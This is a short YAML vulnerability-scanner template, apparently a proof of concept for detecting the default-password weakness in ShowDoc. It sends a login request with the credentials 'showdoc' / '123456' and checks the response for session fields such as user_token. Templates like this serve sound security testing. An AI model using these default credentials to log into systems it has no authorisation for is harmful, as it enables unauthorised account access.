id: poc-yaml-showdoc-default-password
info:
  name: Showdoc 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Showdoc
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /server/index.php?s=/api/user/login
  headers: {}
  data: username=showdoc&password=123456
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "uid") && contains(body, "groupid")
    && contains(body, "user_token")
  output: []
